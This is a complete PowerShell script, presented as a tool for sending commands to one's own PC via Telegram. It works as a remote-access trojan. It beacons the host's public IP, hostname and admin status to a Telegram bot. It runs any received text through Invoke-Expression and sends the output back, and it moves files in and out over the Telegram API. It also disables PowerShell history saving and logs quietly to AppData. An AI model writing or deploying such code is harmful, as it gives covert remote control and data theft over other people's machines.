
# Send PowerShell commands over the Internet to your PC via Telegram

Clear-Host  # Clear the shell
Set-PSReadlineOption    -HistorySaveStyle   SaveNothing             # Do not save commands run in this powershell session
Set-Location            -Path               $env:USERPROFILE        # Set location to the user's folder
Add-Type                -AssemblyName       System.Windows.Forms    # Adds a Microsoft .NET class to a PowerShell session
Add-type                -AssemblyName       System.Drawing          # Adds a Microsoft .NET class to a PowerShell session

$tTOKEN                     = "@TOKEN"  # your API Token    (without the "@")
$tID                        = "@ID"     # your Telegram ID  (without the "@")

$ps_debug                   = $true
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $tTOKEN
$api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'                 -f $tTOKEN
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $tTOKEN
$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $tTOKEN
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $tTOKEN, $tID
$cache_file                 = '{0}\ps_cache'                                                -f $env:LOCALAPPDATA
$log_file                   = '{0}\ps_logfile'                                              -f $env:LOCALAPPDATA
$wait                       =  1000
$Global:ProgressPreference  = 'SilentlyContinue'


function saveLocalLogs ($loglevel, $string) 
{
    if ($ps_debug) {
        $datetime   = Get-Date -Format ''
        $output     = ("[" + $datetime + "] " + $string)

        if ($loglevel -match "log") {
            Write-Host -BackgroundColor Black -ForegroundColor Yellow $output
        } elseif ($loglevel -match "err") {
            Write-Host -BackgroundColor Black -ForegroundColor Red $output
        }

        try {
            Add-Content -Path $log_file -Value $output -Force
        } catch {
            Write-Host "log" -BackgroundColor Black -ForegroundColor Red $Error[0]
        }
    }
}


function splitOutput ($output)
# The "splitOutput" function takes as a parameter a long text message that goes beyond 4096 characters.
# Divide the characters and create blocks of 4096 letters.
# The return of the function is an array.
{
    if ($output.Length -gt 4096) {
        saveLocalLogs "log" "Separation for every 4096 characters of the input output..."
    }

    $output_splitted        = $output -split ""             # Split every character from the incoming output
    $temp_part_of_output    = ""                            # Set a temporary block for save chars into it
    $array_of_output_parts  = @()                           # Set an array that it will used for saving multipart strings
    $counter                = 0                             # Set a counter to 0

    saveLocalLogs "log" "Working on it..."

    foreach ($char in $output_splitted) {
        if ($counter -eq 4096) {
            saveLocalLogs "log" "Creating a block..."
            $array_of_output_parts += $temp_part_of_output
            saveLocalLogs "log" "Block created..."
            $temp_part_of_output = ""
            $counter = 0
        }

        $temp_part_of_output += $char
        $counter += 1
    }
    
    saveLocalLogs "log" "Create the last block..."
    $array_of_output_parts += $temp_part_of_output
    
    saveLocalLogs "log" "The output is ready to be sent"
    return $array_of_output_parts
}


function checkAdminRights()
# The "checkAdminRights" function will check if the user running the Bot is a system administrator or not.
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ($env:USERNAME + " is an Administrator")
    } else {
        return ($env:USERNAME + " is not an Administrator")
    }
}


function downloadDocument ($file_id, $file_name)
# The "downloadDocument" function takes as parameters the file_id and the file_name of the document uploaded to Telegram by the controller of the Bot. 
# Send a Get request to the Telegram API to download the file.
{
    saveLocalLogs "log" "Getting the informations about this document..."
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
    $file_path      = $get_file_path.result.file_path

    saveLocalLogs "log" "The file information was found, downloading it..."
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name
    
    saveLocalLogs "log" "Checking the file..."
    if (Test-Path -Path $file_name) {
        saveLocalLogs "log" "Downloaded"
        sendMessage "Downloaded"
    } else {
        saveLocalLogs "log" "File was not downloaded"
        sendMessage "File was not downloaded"
    }
}


function sendDocument ($file)
# The "sendDocument" function takes the path of a file as a parameter. 
# If the incoming file is verified, use curl.exe to unsecure (for now) the file to Telegram.
{
    if (Test-Path -Path $file) {
        try {
            saveLocalLogs "log" "Sending the document..."
            curl.exe -F document=@"$file" $api_upload_file --insecure | Out-Null    # Temporary solution (CURL.exe)
            saveLocalLogs "log" "Document was sent"
        }
        catch {
            $err = $Error[0]
            saveLocalLogs "err" $err
            sendMessage $err
        }
    } else {
        saveLocalLogs "log" "This file does not exists"
        sendMessage "This file does not exists"
    }
}


function sendMessage ($output, $message_id)
# The "sendMessage" function takes as parameters the output of the command executed and the ID of the incoming message to reply to it. 
# To send the output as a Telegram message, the function creates a psobject object and constructs it by adding new members and member types. 
# The message will then be sent to a JSON object. 
# Finally try to send the message by making an HTTPS call to the Telegram API.
{
    saveLocalLogs "log" "Preparing for sending the output..."

    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $tID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'reply_to_message_id'        -Value $message_id
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + $output + "</pre>")
    $MessageToSend = $MessageToSend | ConvertTo-Json # Convert the message created to a JSON format

    try {
        saveLocalLogs "log" "Send via API the message containing the output..."
        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" | Out-Null   # Send an HTTPS POST request
        saveLocalLogs "log" "The message has been successfully sent"
    } catch {
        saveLocalLogs "err" $Error[0]
        Start-Sleep -Seconds 3
    }
}


function commandListener 
# The "commandListener" function establishes a connection to the Telegram API waiting for a new message from the controller of the Bot. 
# Once the controller of the Bot sends a message, it is interpreted as a command to be executed on the Bot's powershell. 
# Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
# Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
{
    saveLocalLogs "log" "Listening for commands..."
    while ($true) {
        try {
            $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
            $message    = $message.result.Message[-1]                                   # Get the last JSON record
            $message_id = $message.message_id                                           # Get the message_id of the update
            $user_id    = $message.chat.id                                              # Get the ID about the sender message
            $text       = $message.text                                                 # Get the text message (it will be the command that you want to execute)
            $document   = $message.document                                             # If there is a document value inside the JSON record save it to this variable
            
            # saveLocalLogs "log" "Check for a new incoming command..."
            if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id) {
                saveLocalLogs "log" "A new command has been discovered! [$text]"

                saveLocalLogs "log" "Saving the message_id [$message_id] to the cache file..."
                Add-Content -Path $cache_file -Value $message_id -Force
                
                saveLocalLogs "log" "Checking for the validation of the user ID..."
                if ($user_id -match $tID) {
                    saveLocalLogs "log" "User ID has been verified"
                    if ($text -match "exit") {
                        saveLocalLogs "log" "Connection closed"
                        exit
                    }
                    
                    saveLocalLogs "log" "Checking the length of the command..."
                    if ($text.Length -gt 0) {
                        try {
                            saveLocalLogs "log" "Execution..."
                            $output = Invoke-Expression -Command $text
                            saveLocalLogs "log" "Converting the output captured to a String..."
                            $output = $output | Out-String
                        } catch {
                            $err = $Error[0]
                            saveLocalLogs "err" "ERROR DURING THE EXECUTION OF THE INSTRUCTIONS"
                            saveLocalLogs "err" $err
                            $output = $err | Out-String
                        }
                        
                        saveLocalLogs "log" "Sends the captured output to the split function..."
                        $output = splitOutput $output
                        
                        saveLocalLogs "log" "Send to Telegram all blocks returned from the split function..."
                        foreach ($block in $output) {
                            saveLocalLogs "log" "Converting to string the splitted block..."
                            $block = $block | Out-String

                            saveLocalLogs "log" "Checking if the block size is major than 2..."
                            if ($block.Length -gt 2) {
                                saveLocalLogs "log" "Send the data to the message sending function..."
                                sendMessage $block $message_id
                            } else {
                                saveLocalLogs "log" "Send the data to the message sending function..."
                                sendMessage "No Output Data" $message_id
                            }
                        }

                        saveLocalLogs "log" "Set the timer to 500ms"
                        $wait = 500
                    }
                    
                    if ($document) {
                        saveLocalLogs "log" "Getting the informations about the file..."
                        $file_id   = $document.file_id
                        $file_name = $document.file_name
                        
                        # saveLocalLogs "log" "File informations: [$file_id] [$file_name]"

                        saveLocalLogs "log" "Send these informations to the download file function..."
                        downloadDocument $file_id $file_name
                    }
                } else {
                    $unauth_user_found = ("Unauthorized user found! " + $user_id)
                    saveLocalLogs "log" $unauth_user_found
                    sendMessage $unauth_user_found
                }
            }

            if ($wait -eq 15000) {
                saveLocalLogs "log" "The timer has reached the maximum of its default value, I reset it to 1000ms..."
                sendMessage "[heartbeat]"
                $wait = 500
            } else {
                $wait = $wait + 100
            }
            
            Start-Sleep -Milliseconds $wait
        } catch {
            $err = $Error[0]
            saveLocalLogs "err" $err
            saveLocalLogs "log" "Waiting 5 seconds..."
            Start-Sleep -Seconds 5
        }
    }
}


saveLocalLogs "log" "Checking the cache file..."
if (-Not(Test-Path -Path $cache_file)) {
    saveLocalLogs "log" "Creating the cache file..."
    Add-Content -Path $cache_file -Value "0" -Force
}


try {
    if ((tnc).PingSucceeded) {
        saveLocalLogs "log" "Alert the Bot owner that the listener has been started!"
        saveLocalLogs "log" "Recovering initial informations..."
        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
        $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
        $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
        $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
        $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
        sendMessage $_body                                                              # Send a message with the body 
        saveLocalLogs "log" "Alert sent"
    }
}
catch {
    saveLocalLogs "err" $Error[0]
}


commandListener # Start the Bot